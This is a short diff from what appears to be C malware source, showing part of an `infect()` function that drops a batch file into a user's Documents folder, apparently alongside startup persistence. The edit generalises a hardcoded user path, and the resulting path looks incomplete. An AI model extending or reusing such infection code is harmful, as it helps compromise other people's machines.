@@ -103,8 +103,7 @@ void RegisterProgram()
 
 void infect(){
     char pathLocation[MAX_PATH];
-    strcpy(pathLocation, "C:\\Users\\vecma");
-    //    strcpy(pathLocation, "C:\\Users\\");
+    strcpy(pathLocation, "C:\\Users\\");
     strcat(pathLocation, "\\Documents\\nananana.bat");
     
     char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
